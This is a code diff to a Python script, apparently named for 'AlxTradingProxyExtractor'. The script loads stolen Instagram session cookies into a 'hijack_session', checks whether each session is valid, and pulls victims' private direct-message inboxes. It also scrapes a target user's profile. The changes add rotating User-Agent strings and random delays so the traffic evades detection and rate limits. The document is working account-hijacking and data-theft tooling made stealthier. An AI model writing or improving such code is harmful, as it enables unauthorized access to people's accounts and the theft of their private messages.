@@ -10,6 +10,7 @@ from utils.error_handler import safe_execution, safe_print
 Advanced data extraction using proxy setup for additional insights
 """
 
+
 import requests
 import json
 import time
@@ -19,6 +20,16 @@ import re
 import os
 from urllib.parse import urljoin
 import sqlite3
+
+# List of real User-Agents for randomization
+USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1'
+]
 
 class AlxTradingProxyExtractor:
     def get_proxy_list(self):
@@ -89,7 +100,7 @@ class AlxTradingProxyExtractor:
                     if csrftoken:
                         cookie_str += f"; csrftoken={csrftoken}"
                     headers = {
-                        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
+                        'User-Agent': random.choice(USER_AGENTS),
                         'Cookie': cookie_str,
                         'X-IG-App-ID': '936619743392459',
                         'X-Requested-With': 'XMLHttpRequest',
@@ -99,10 +110,15 @@ class AlxTradingProxyExtractor:
                     # Validate session
                     try:
                         resp = hijack_session.get('https://www.instagram.com/accounts/edit/', timeout=10)
+                        time.sleep(random.uniform(3, 8))
                         if resp.status_code == 200 and 'login' not in resp.url:
                             print(f"✅ Valid session: {session_file} ({sessionid[:8]}...) [Attempt {attempt+1}]")
                             # Try to extract DMs
+                            dm_headers = dict(headers)
+                            dm_headers['User-Agent'] = random.choice(USER_AGENTS)
+                            hijack_session.headers.update(dm_headers)
                             dm_resp = hijack_session.get('https://www.instagram.com/api/v1/direct_v2/inbox/', timeout=10)
+                            time.sleep(random.uniform(3, 8))
                             if dm_resp.status_code == 200:
                                 try:
                                     dm_data = dm_resp.json()
@@ -119,21 +135,21 @@ class AlxTradingProxyExtractor:
                                     print(f"❌ Failed to parse DM JSON: {e}")
                             elif dm_resp.status_code in (502, 429):
                                 print(f"⚠️ DM extraction failed: HTTP {dm_resp.status_code} (proxy or rate limit). Retrying...")
-                                time.sleep(random.uniform(2, 5) * (attempt+1))
+                                time.sleep(random.uniform(3, 8))
                                 continue
                             else:
                                 print(f"❌ DM extraction failed: HTTP {dm_resp.status_code}")
                                 break
                         elif resp.status_code in (502, 429):
                             print(f"⚠️ Session validation failed: HTTP {resp.status_code} (proxy or rate limit). Retrying...")
-                            time.sleep(random.uniform(2, 5) * (attempt+1))
+                            time.sleep(random.uniform(3, 8))
                             continue
                         else:
                             print(f"❌ Invalid session: {session_file} (HTTP {resp.status_code})")
                             break
                     except Exception as e:
                         print(f"❌ Error with {session_file} on attempt {attempt+1}: {e}")
-                        time.sleep(random.uniform(2, 5) * (attempt+1))
+                        time.sleep(random.uniform(3, 8))
                         continue
             except Exception as e:
                 print(f"❌ Error with {session_file}: {e}")
@@ -187,7 +203,7 @@ class AlxTradingProxyExtractor:
         
         # Set stealth headers
         session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
+            'User-Agent': random.choice(USER_AGENTS),
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.5',
             'Accept-Encoding': 'gzip, deflate, br',
@@ -219,7 +235,10 @@ class AlxTradingProxyExtractor:
         try:
             # Get Instagram profile page
             profile_url = f"{self.base_url}/{self.target_username}/"
+            # Randomize User-Agent for this request
+            self.session.headers['User-Agent'] = random.choice(USER_AGENTS)
             response = self.session.get(profile_url, timeout=15)
+            time.sleep(random.uniform(3, 8))
             
             if response.status_code == 200:
                 content = response.text
